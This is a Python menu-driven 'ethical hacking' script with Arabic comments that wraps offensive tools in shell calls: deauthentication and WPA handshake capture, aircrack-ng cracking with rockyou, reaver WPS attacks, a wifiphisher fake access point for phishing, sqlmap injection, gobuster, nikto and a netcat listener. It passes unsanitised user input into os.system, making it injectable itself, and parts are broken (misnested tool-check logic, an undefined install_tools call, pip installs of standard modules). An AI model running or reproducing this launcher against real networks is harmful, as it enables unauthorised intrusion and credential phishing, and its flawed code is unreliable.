#!/usr/bin/env python3
# Author: Akash Black Hat
# Ethical Hacking Tools (For Education and Research Purposes
import os,time
#تثبيت المكاتب
os.system('clear' if os.name == 'posix' else 'cls')
os.system('pip install webbrowser')
os.system('pip install time')
#اللوان

B="\033[38;5;27m"   #ازرق
G="\033[38;5;46m"   #اخضر
r="\033[38;5;196m"  #احمر
C="\033[38;5;44m"   #سمائي
M="\033[38;5;141m"  #بنفسجي
N="\033[0m"
# التحقق من نضام التشغيل وتثبيت المكاتب على جميع الانضمة دون اخطاء
os.system('clear' if os.name == 'posix' else 'cls')
revision = input(f"{C}هل تريد التحقق من وجود الادوات لتجنب الاخطاء؟ [Y/N] : ")
if revision.lower() != 'n':
    os.system('clear' if os.name == 'posix' else  'cls')
    libraries = ['sys','time','webbrowser']
    print(f" {G}    -_جاري التحقق من وجود المكاتب_-")
    for lib in libraries:
      try:
        __import__(lib)
        print(f"{M}╔═══════════════════════════════════════╗")
        print(f"{M}║{r}   موجودة   - {G}{lib}{r} - المكتبة      {M}     ║ ")
        print(f"{M}╚═══════════════════════════════════════╝\n")
        time.sleep(3)
      except ImportError:
        print(f"{C} _________________________________________________________\n")
        print(f"{G}ما موجودة راح اثبتها الك الان - {r}{lib}{G} - المكتبة  ")
        time.sleep(2)
        os.system("pip install" + lib)
#التحقق من وجود الادوات المطلوبة
        os.system('clear' if os.name == 'posix' else  'cls')
        tools = [
            "aircrack-ng", "crunch", "xterm", "wordlists", "reaver", "pixiewps", 
            "bully", "wifite", "airodump-ng", "nmap", "metasploit-framework", 
            "hydra", "wifiphisher", "nikto", "netcat", "gobuster", "ncat", "sqlmap"
        ]
        print(f"""
        {r}  ■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■
        {r}  ■  {G}  جارٍ التحقق من وجود الأدوات التي نحتاجها  {r}■
        {r}  ■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■
        """)
        time.sleep(3)
        for tool in tools:
          check = os.system(f"which {tool} > /dev/null 2>&1")
        if check == 0:
           print(f" | ✓ موجودة -{G} {tool} {N}- الاداة |")
           time.sleep(2)
           os.system('clear' if os.name == 'posix' else  'cls')
    else:
           os.system('clear' if os.name == 'posix' else  'cls')
           print(f"{G}■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■\n")
           print(f" | غير مثبته سيتم تثبيتها  -{r}{tool}{N}- الاداة |")
           time.sleep(2)
           os.system(f"apt install {tool}")
           os.system('clear' if os.name == 'posix' else  'cls')
else:
    pass

import sys
import time
import webbrowser







# Functions for Wireless Network and WPS Attacks
def start_monitor_mode(interface):
    print(f"Starting monitor mode on {interface}...\n")
    os.system(f"airmon-ng start {interface} && airmon-ng check kill")

def stop_monitor_mode(interface):
    print(f"Stopping monitor mode on {interface}...")
    os.system(f"airmon-ng stop {interface} && service network-manager restart")

def scan_networks(interface):
    print(f"Scanning for networks on {interface}...")
    os.system(f"airodump-ng {interface} -M")

def get_handshake(interface, bssid, channel, path, packets):
    print(f"Capturing handshake from {bssid} on channel {channel}...")
    os.system(f"airodump-ng {interface} --bssid {bssid} -c {channel} -w {path} | xterm -e aireplay-ng -0 {packets} -a {bssid} {interface}")

def crack_handshake_with_wordlist(handshake_path,wordlist_path):
    print(f"Cracking handshake from {handshake_path} using wordlist {wordlist_path}...")
    os.system(f"aircrack-ng {handshake_path} -w {wordlist_path}")

def crack_handshake_without_wordlist(handshake_path, essid):
    print(f"Cracking handshake from {handshake_path} with ESSID {essid}...")
    os.system(f"aircrack-ng {handshake_path} -e {essid}")

# Functions to Create Wordlist and Perform WPS Attack
def create_wordlist(min_length, max_length, characters, output_path):
    print(f"Creating wordlist with length from {min_length} to {max_length}...")
    os.system(f"crunch {min_length} {max_length} {characters} -o {output_path}")

def perform_wps_attack(interface, bssid):
    print(f"Performing WPS attack on {bssid}...")
    os.system(f"reaver -i {interface} -b {bssid} -vv")

# Nmap Network Scanning
def scan_networks_with_nmap(target_ip):
    print(f"Scanning network with Nmap on target {target_ip}...")
    os.system(f"nmap -sn {target_ip}")

# Phishing Attack with Wifiphisher
def perform_phishing_attack(interface, bssid):
    print(f"Performing phishing attack on {bssid}...")
    os.system(f"wifiphisher -i {interface} --fakeap -b {bssid}")

# Nikto Web Server Scan
def scan_web_server_with_nikto(target_url):
    print(f"Scanning web server {target_url} with Nikto...")
    os.system(f"nikto -h {target_url}")

# Listening on Port with Netcat
def listen_with_netcat(port):
    print(f"Listening on port {port} with Netcat...")
    os.system(f"nc -lvp {port}")

# Directory Brute Forcing with Gobuster
def brute_force_directories(target_url):
    print(f"Brute forcing directories on {target_url}...")
    os.system(f"gobuster dir -u {target_url} -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt")

# SQL Injection with SQLMap
def perform_sql_injection(target_url):
    print(f"Performing SQL Injection attack on {target_url} with SQLMap...")
    os.system(f"sqlmap -u {target_url} --batch")

# Main menu to interact with the script
def main():
    while True:
        print(f"""
        
{r} _    _            _    _               _______          _     
{r}| |  | |          | |  (_)             |__   __|        | |    
{r}| |__| | __ _  ___| | ___ _ __   __ _     | | ___   ___ | |___ 
{r}|  __  |/ _` |/ __| |/ / | '_ \ / _` |    | |/ _ \ / _ \| / __|
{r}| |  | | (_| | (__|   <| | | | | (_| |    | | (_) | (_) | \__ \
{r}
{r}|_|  |_|\__,_|\___|_|\_\_|_| |_|\__, |    |_|\___/ \___/|_|___/
{r}                                 __/ |                         
{r}                                |___/                          

                                {r} V-1


         {r}|#############################|   {r} Author : NEMO FROM IRAQ 
         {r}|#############################|
         {G}|      #### لله اكبر ####     |
         {N}|#############################|
         {N}|#############################|
         
      
      
               {r}  Tools : {G}A collection of ethical Hacking Tools.        {N}                                                       
    ---------------------------------------------------------------------------------  

            Menu:
            1) Start monitor mode
            2) Stop monitor mode
            3) Scan networks
            4) Capture handshake
            5) Install wireless tools
            6) Crack handshake (rockyou.txt)
            7) Crack handshake with custom wordlist
            8) Crack handshake without wordlist
            9) Create wordlist
            10) Perform WPS attack
            11) Scan network with Nmap
            14) Perform phishing attack with Wifiphisher
            15) Scan web server with Nikto
            16) Listen with Netcat
            17) Brute-force directories with Gobuster
            18) Perform SQL Injection with SQLMap
             I) About Me
             0) Exit
    ---------------------------------------------------------------------------------  
""")

        choice = input(f"{B}Enter your choice:{M} ")

        if choice == '1':
            interface = input("Enter the interface: ")
            start_monitor_mode(interface)
        elif choice == '2':
            interface = input("Enter the interface: ")
            stop_monitor_mode(interface)
        elif choice == '3':
            interface = input("Enter the interface: ")
            scan_networks(interface)
        elif choice == '4':
            interface = input("Enter the interface: ")
            bssid = input("Enter the target BSSID: ")
            channel = input("Enter the channel: ")
            path = input("Enter the path for output file: ")
            packets = input("Enter the number of packets: ")
            get_handshake(interface, bssid, channel, path, packets)
        elif choice == '5':
            install_tools()
        elif choice == '6':
            handshake_path = input("Enter the handshake file path: ")
            crack_handshake_with_wordlist(handshake_path, "/usr/share/wordlists/rockyou.txt")
        elif choice == '7':
            handshake_path = input("Enter the handshake file path: ")
            wordlist_path = input("Enter the wordlist file path: ")
            crack_handshake_with_wordlist(handshake_path, wordlist_path)
        elif choice == '8':
            handshake_path = input("Enter the handshake file path: ")
            essid = input("Enter the ESSID: ")
            crack_handshake_without_wordlist(handshake_path, essid)
        elif choice == '9':
            min_length = int(input("Enter the minimum length of passwords: "))
            max_length = int(input("Enter the maximum length of passwords: "))
            characters = input("Enter characters for the wordlist: ")
            output_path = input("Enter the output path for the wordlist: ")
            create_wordlist(min_length, max_length, characters, output_path)
        elif choice == '10':
            interface = input("Enter the interface: ")
            bssid = input("Enter the BSSID: ")
            perform_wps_attack(interface, bssid)
        elif choice == '11':
            target_ip = input("Enter the target IP for Nmap scan: ")
            scan_networks_with_nmap(target_ip)
        elif choice == '14':
            interface = input("Enter the interface: ")
            bssid = input("Enter the BSSID: ")
            perform_phishing_attack(interface, bssid)
        elif choice == '15':
            target_url = input("Enter the target URL: ")
            scan_web_server_with_nikto(target_url)
        elif choice == '16':
            port = input("Enter the port to listen on: ")
            listen_with_netcat(port)
        elif choice == '17':
            target_url = input("Enter the target URL: ")
            brute_force_directories(target_url)
        elif choice == '18':
            target_url = input("Enter the target URL for SQL Injection: ")
            perform_sql_injection(target_url)
        elif choice == '0':
            print("Exiting...")
            break
        else:
            print("Invalid choice, please try again.")

if __name__ == "__main__":
    main()
